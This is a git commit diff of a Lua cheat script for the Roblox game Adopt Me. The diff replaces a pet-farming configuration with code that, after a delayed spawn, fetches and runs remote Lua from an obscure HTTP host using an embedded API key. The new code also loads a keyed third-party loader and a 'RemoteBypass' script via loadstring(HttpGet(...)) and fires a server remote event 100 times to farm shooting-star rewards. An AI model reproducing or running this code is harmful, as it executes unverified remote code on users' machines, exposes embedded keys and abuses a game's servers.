84c1c6a8b2ee8ba2896946831f9b5950526fabc5
greg66n <darien95sm@hotmail.com>
2025-02-03 05:02:10 -0800

    Update adopt1.lua

--- adopt1.lua
+++ adopt1.lua
@@ -1,44 +1,34 @@
-Config = {
-    PetFarm = {
-        Enabled = true,            -- Master switch for pet farming
-        AutoNeon = true,          -- Makes neon pets when you have 4 full grown
-        FarmUntilFullyGrown = false, -- true = farms youngest pets | false = oldest pets
-        PrioritizeFriendship = true, -- true = highest friendship pets | false = by age only
-        FarmEggs = false,           -- Farm eggs until they hatch then buys more
-        EggType = "cracked_egg",   -- cracked_egg, regular_pet_egg, royal_egg, garden_2024_egg
-        SelectFarmEgg = "any",    
-        BuyEggs = false,           -- Auto buys eggs when needed
-        AutoAgePotionEnabled = false,
-        AutoAgePotionPets = {"winter_2024_ice_cube","winter_2024_berry_cool_cube"}, -- example of how u use multiple pets
-        RarityFarming = {
-            Enabled = false, -- enable for rarity farming on wor
-            Order = {
-                "ultra_rare", -- highest priority 
-                "common",
-                "legendary",
-                "rare",
-                "uncommon" -- lowest priority 
-            }
-        }
-    },
-    BabyFarm = {
-        Enabled = true,           -- Master switch for baby farming
-        Priority = "BabyFirst",    -- BabyFirst = do baby tasks first | PetFirst = do pet tasks first
-    },
-    Webhook = {
-        Enabled = true,            -- Enable Discord alerts
-        URL = "webhook here",          -- Your webhook
-    },
-    FPSSaver = {
-        Enabled = false,           -- FPS boost mode
-        Disable3DRendering = false, -- Max performance
-        FPSCap = 60                -- FPS cap 
-    },
-    UI = {
-        Maximized = false,          -- true = big | false = small
-        Scale = 1                  -- 0.1 = tiny, 0.5 = half, 1 = full
-    }
+task.spawn(function()
+    task.wait(35)
+    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
+    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
+end)
+
+task.spawn(function()
+   -- ARCEUS, CODEX ETC
+script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
+getgenv().Config = {
+    ["Winter_EVENT"] = false,
+    ["PetFarmActive"] = true,
+    ["EggFarmActive"] = false,
+    ["Blur_username"] = true,
+    ["Blazing_Lion_Log"] = false,
+    ["DiscordId"] = "942321951010086922",
+    ["Webhook"] = "https://discord.com/api/webhooks/123456",
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
+end)
+wait(1)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
+wait(1)
+local args = {
+    [1] = "MoonInterior",
+    [3] = true
 }
 
-script_key="OkbUgSyCLieCMbeVqgTZOAgbKIdxjRLH"
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/8a2399ec22841391ee52540ec7c001e1.lua"))() --A
+for i = 1, 100 do
+    args[2] = tostring(i)
+    game:GetService("ReplicatedStorage").API:FindFirstChild("MoonAPI/ShootingStarCollected"):FireServer(unpack(args))
+    wait(0.2)  -- Delay of 0.2 seconds
+end
+
